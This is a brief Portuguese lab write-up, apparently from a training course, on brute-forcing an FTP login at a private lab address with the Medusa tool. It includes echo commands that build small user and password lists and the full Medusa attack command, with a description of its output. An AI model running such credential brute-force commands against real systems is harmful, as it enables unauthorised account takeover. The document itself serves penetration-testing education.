# dio  Preparação: Inicialmente, criei o arquivo pass.txt usando o comando echo, inserindo senhas comuns (123456, password, qwerty, etc.). O arquivo users.txt foi criado previamente (ou eu o obtive de outra fonte) e continha os usuários user e msfadmin.

Execução do Ataque: Em seguida, lancei o Medusa, especificando os parâmetros:Alvo (-h): O endereço IP 192.168.56.101.Protocolo (-m): FTP.Arquivos de Entrada (-U e -P): Os arquivos users.txt e pass.txt.Threads (-t): 6 threads simultâneas para otimizar o tempo de execução.$$\text{medusa -h 192.168.56.101 -U users.txt -P pass.txt -m ftp -t 6}$$

Resultado: A saída mostra o Medusa realizando a ACCOUNT CHECK (Verificação de Conta), testando as combinações de usuário e senha. Note que as tentativas iniciais para user e msfadmin com senhas como qwerty e password estão sendo processadas.

echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt

# Executa o ataque de força bruta contra o serviço FTP no IP 192.168.56.101
medusa -h 192.168.56.101 -U users.txt -P pass.txt -m ftp -t 6
